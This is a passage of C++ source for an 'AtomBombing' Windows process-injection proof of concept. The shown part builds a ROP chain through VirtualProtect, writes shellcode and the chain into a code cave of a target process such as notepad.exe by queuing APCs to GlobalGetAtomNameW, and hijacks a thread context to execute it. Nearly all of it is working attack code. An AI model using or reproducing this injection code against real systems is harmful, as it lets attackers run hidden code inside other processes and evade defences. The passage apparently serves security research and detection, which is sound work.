        if (gadgets.movR9RaxRet)       pushQword(gadgets.movR9RaxRet);
        else if (gadgets.xchgR9RaxRet) pushQword(gadgets.xchgR9RaxRet);
    }

    // Return into VirtualProtect
    pushQword(gadgets.virtualProtect);

    // After VirtualProtect returns, jump to shellcode entry (skipping prefix)
    pushQword(shellcodeEntry);

    printf("[*] ROP chain built: %zu bytes (%zu qwords)\n",
           ropChain.size(), ropChain.size() / 8);

    return ropChain;
}

// ============================================================
// APC-Based Data Writer
// ============================================================

BOOL WriteDataViaAtomApc(
    HANDLE hThread,
    const std::vector<AtomChunk>& atoms,
    ULONG_PTR targetBaseAddr)
{
    typedef UINT (WINAPI *pGlobalGetAtomNameW_t)(ATOM, LPWSTR, int);

    pGlobalGetAtomNameW_t pGlobalGetAtomNameW = (pGlobalGetAtomNameW_t)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "GlobalGetAtomNameW");

    if (!pGlobalGetAtomNameW) {
        pGlobalGetAtomNameW = (pGlobalGetAtomNameW_t)
            GetProcAddress(GetModuleHandleW(L"kernelbase.dll"), "GlobalGetAtomNameW");
    }

    if (!pGlobalGetAtomNameW) {
        printf("[-] Failed to resolve GlobalGetAtomNameW\n");
        return FALSE;
    }

    printf("[*] GlobalGetAtomNameW at 0x%p\n", (void*)pGlobalGetAtomNameW);

    for (const auto& chunk : atoms) {
        ULONG_PTR writeAddr = targetBaseAddr + chunk.offset;
        DWORD wcharCount = chunk.dataSize / sizeof(WCHAR);

        NTSTATUS status = NtQueueApcThread(
            hThread,
            (PPS_APC_ROUTINE)pGlobalGetAtomNameW,
            (PVOID)(ULONG_PTR)chunk.atom,
            (PVOID)writeAddr,
            (PVOID)(ULONG_PTR)wcharCount
        );

        if (!NT_SUCCESS(status)) {
            printf("[-] NtQueueApcThread failed for chunk at offset %u: 0x%08lX\n",
                   chunk.offset, (unsigned long)status);
            return FALSE;
        }

        printf("    Queued APC: atom=0x%04X -> 0x%p (%lu WCHARs)\n",
               chunk.atom, (void*)writeAddr, (unsigned long)wcharCount);
    }

    printf("[+] All %zu APCs queued successfully\n", atoms.size());
    return TRUE;
}

// ============================================================
// Context Hijacking
// ============================================================

BOOL HijackThreadForRop(
    HANDLE hThread,
    ULONG_PTR ropChainAddr,
    ULONG_PTR retGadgetAddr)
{
    ULONG suspendCount;
    NTSTATUS status;

    status = NtSuspendThread(hThread, &suspendCount);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtSuspendThread failed: 0x%08lX\n", (unsigned long)status);
        return FALSE;
    }
    printf("[+] Thread suspended (previous suspend count: %lu)\n",
           (unsigned long)suspendCount);

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    status = NtGetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtGetContextThread failed: 0x%08lX\n", (unsigned long)status);
        NtResumeThread(hThread, &suspendCount);
        return FALSE;
    }

    printf("[*] Original context:\n");
    printf("    RIP = 0x%p\n", (void*)ctx.Rip);
    printf("    RSP = 0x%p\n", (void*)ctx.Rsp);

    ctx.Rsp = ropChainAddr;
    ctx.Rip = retGadgetAddr;

    printf("[*] Hijacked context:\n");
    printf("    RIP = 0x%p (ret gadget)\n", (void*)ctx.Rip);
    printf("    RSP = 0x%p (ROP chain)\n", (void*)ctx.Rsp);

    status = NtSetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtSetContextThread failed: 0x%08lX\n", (unsigned long)status);
        NtResumeThread(hThread, &suspendCount);
        return FALSE;
    }

    printf("[+] Thread context hijacked successfully\n");

    status = NtResumeThread(hThread, &suspendCount);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtResumeThread failed: 0x%08lX\n", (unsigned long)status);
        return FALSE;
    }

    printf("[+] Thread resumed -- ROP chain executing\n");
    return TRUE;
}

// ============================================================
// Target Process Finder
// ============================================================

DWORD FindProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

// ============================================================
// Main
// ============================================================

int main(int argc, char* argv[]) {
    printf("=== AtomBombing Process Injection PoC ===\n\n");
    fflush(stdout);

    // ---- Attach to GUI subsystem (Windows 11 24H2+ fix) ----
    if (!AttachToGuiSubsystem()) {
        printf("[-] Failed to attach to GUI subsystem\n");
        return 1;
    }
    printf("\n");

    const wchar_t* targetName = L"notepad.exe";
    wchar_t targetNameBuf[MAX_PATH] = { 0 };
    if (argc > 1) {
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, targetNameBuf, MAX_PATH);
        targetName = targetNameBuf;
    }

    DWORD targetPid = FindProcessByName(targetName);
    if (targetPid == 0) {
        printf("[-] Target process '%ls' not found. Launch it first.\n", targetName);
        if (g_hiddenWnd) DestroyWindow(g_hiddenWnd);
        return 1;
    }
    printf("[+] Target: %ls (PID: %lu)\n\n", targetName, (unsigned long)targetPid);
    fflush(stdout);

    // ---- Stage 0: Preparation ----
    printf("--- Stage 0: Preparation ---\n");
    fflush(stdout);

    DWORD startTick = GetTickCount();

    RopGadgets gadgets;
    if (!FindRopGadgets(&gadgets)) {
        printf("[-] ROP gadget search failed\n");
        if (g_hiddenWnd) DestroyWindow(g_hiddenWnd);
        return 1;
    }

    printf("[*] Gadget search took %lu ms\n",
           (unsigned long)(GetTickCount() - startTick));
    fflush(stdout);

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    SIZE_T totalSize = sizeof(g_Shellcode) + 4096;
    CodeCave cave;
    if (!FindCodeCave((ULONG_PTR)hNtdll, &cave, totalSize)) {
        printf("[-] No suitable code cave found in ntdll\n");
        if (g_hiddenWnd) DestroyWindow(g_hiddenWnd);
        return 1;
    }

    ULONG_PTR caveStart      = cave.address;
    ULONG_PTR shellcodeEntry = caveStart + SHELLCODE_PREFIX;
    SIZE_T    shellcodeTotal = sizeof(g_Shellcode);

    ULONG_PTR ropAddr        = (caveStart + shellcodeTotal + 0x100) & ~(ULONG_PTR)0xF;
    ULONG_PTR oldProtectAddr = ropAddr - 8;

    printf("[*] Layout in target:\n");
    printf("    Cave start:      0x%p\n", (void*)caveStart);
    printf("    Shellcode entry: 0x%p (cave_start + %zu)\n",
           (void*)shellcodeEntry, (SIZE_T)SHELLCODE_PREFIX);
    printf("    Shellcode size:  %zu bytes (incl. prefix)\n", shellcodeTotal);
    printf("    ROP chain:       0x%p\n", (void*)ropAddr);
    printf("    OldProtect:      0x%p\n\n", (void*)oldProtectAddr);
    fflush(stdout);

    // ---- Stage 1: Store payloads in atom table ----
    printf("--- Stage 1: Atom Table Data Storage ---\n");
    fflush(stdout);

    auto shellcodeAtoms = StoreDataInAtoms(g_Shellcode, sizeof(g_Shellcode));
    if (shellcodeAtoms.empty()) {
        printf("[-] Failed to store shellcode in atoms\n");
        if (g_hiddenWnd) DestroyWindow(g_hiddenWnd);
        return 1;
    }

    auto ropChain = BuildRopChain(gadgets,
                                  caveStart,
                                  shellcodeTotal,
                                  shellcodeEntry,
                                  oldProtectAddr);
    auto ropAtoms = StoreDataInAtoms(ropChain.data(), ropChain.size());
    if (ropAtoms.empty()) {
        printf("[-] Failed to store ROP chain in atoms\n");
        CleanupAtoms(shellcodeAtoms);
        if (g_hiddenWnd) DestroyWindow(g_hiddenWnd);
        return 1;
    }

    // ---- Enumerate target threads ----
    printf("\n--- Thread Enumeration ---\n");
    fflush(stdout);
    auto threads = EnumerateTargetThreads(targetPid);
    if (threads.empty()) {
        printf("[-] No accessible threads found in target\n");
        CleanupAtoms(shellcodeAtoms);
        CleanupAtoms(ropAtoms);
        if (g_hiddenWnd) DestroyWindow(g_hiddenWnd);
        return 1;
    }

    HANDLE hTargetThread = threads[0].hThread;
    printf("[*] Using thread TID %lu for APC delivery\n\n",
           (unsigned long)threads[0].threadId);
    fflush(stdout);

    // ---- Stage 1 continued: Queue APCs ----
    printf("--- Stage 1: APC-Based Data Copy ---\n");
    fflush(stdout);

    printf("[*] Copying shellcode via APC...\n");
    fflush(stdout);
    if (!WriteDataViaAtomApc(hTargetThread, shellcodeAtoms, caveStart)) {
        printf("[-] Failed to queue shellcode APCs\n");
        goto cleanup;
    }

    printf("[*] Copying ROP chain via APC...\n");
    fflush(stdout);
    if (!WriteDataViaAtomApc(hTargetThread, ropAtoms, ropAddr)) {
        printf("[-] Failed to queue ROP chain APCs\n");
        goto cleanup;
    }

    // ---- Wait for APC delivery ----
    printf("\n[*] Waiting for APC delivery (target thread must enter alertable wait)...\n");
    printf("[*] Sleeping 5 seconds to allow APC delivery...\n");
    fflush(stdout);
    Sleep(5000);

    // ---- Stage 3: Execute via context hijacking ----
    printf("\n--- Stage 3: Thread Context Hijacking ---\n");
    fflush(stdout);
    if (!HijackThreadForRop(hTargetThread, ropAddr, gadgets.retGadget)) {
        printf("[-] Thread hijacking failed\n");
        goto cleanup;
    }

    printf("\n[+] AtomBombing injection complete!\n");
    printf("[+] Shellcode should now be executing in target process (PID: %lu)\n",
           (unsigned long)targetPid);

cleanup:
    CleanupAtoms(shellcodeAtoms);
    CleanupAtoms(ropAtoms);

    for (auto& t : threads) {
        CloseHandle(t.hThread);
    }

    if (g_hiddenWnd) {
        DestroyWindow(g_hiddenWnd);
        g_hiddenWnd = NULL;
    }

    return 0;
}
